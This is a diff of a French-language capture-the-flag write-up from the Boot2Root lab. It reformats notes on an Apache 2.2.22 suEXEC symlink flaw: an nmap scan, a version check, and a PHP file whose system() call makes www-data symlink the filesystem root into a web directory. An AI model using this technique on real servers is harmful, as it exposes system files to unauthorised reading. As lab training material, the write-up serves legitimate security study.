@@ -2,11 +2,9 @@ Apache suEXEC - Information Disclosure / Privilege Escalationv
 
 
 
-grace a nmap on a pu avoir acces aux versions des serveurs et services accessibles sur les port de la machine :
 
 
-
-~/Documents/42/student/Boot2Root » sudo nmap -sT -sV -O 10.11.200.232
+$> sudo nmap -sT -sV -O 10.11.200.232
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-01 11:07 CET
 Nmap scan report for 10.11.200.232
 Host is up (0.0062s latency).
@@ -26,35 +24,29 @@ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.67 seconds
 
-
-
-on va tester ici les vulnerabilités de apache on est en version 2.2.22 (verifié sur la machine) :
-laurie@BornToSecHackMe:~$ apache2 -version
+$> apache2 -version
 Server version: Apache/2.2.22 (Ubuntu)
 Server built:   Jul 24 2015 17:25:42
 
-
+Explication : 
+grace a nmap on a pu avoir acces aux versions des serveurs et services accessibles sur les port de la machine.
+on va tester ici les vulnerabilités de apache on est en version 2.2.22 (verifié sur la machine).
 version pas recente et sur la quelle des failles sont connues:
 https://www.exploit-db.com/exploits/27397/
- on va donc chercher a exploiter ca:
-
-
+on va donc chercher a exploiter ca.
 apres avoir recuperé l'acces en tant que user 
 je me log en ssh avec un user (ici laurie) j’écris test1.php comme ca
 
-
-laurie@BornToSecHackMe:/var/www/forum/templates_c$ cat test1.php
+/var/www/forum/templates_c$> cat test1.php
 <?php
         system("ln -sf / test42.php");
 ?>
-
 
 ensuite je vais avec un navigateur sur `https://10.11.200.4/forum/templates_c/test1.php` ce qui genere `test42.php -> /` au nom de l'utilisateur www-data
 
 laurie@BornToSecHackMe:/var/www/forum/templates_c$ ls -la test*
 -rw-rw-r-- 1 laurie   laurie   49 Mar  6 12:08 test1.php
 lrwxrwxrwx 1 www-data www-data  1 Mar  6 12:09 test42.php -> /
-
 
 il est maintenant possible d'aller sur la page 
 ```https://10.11.200.4/forum/templates_c/test42.php```
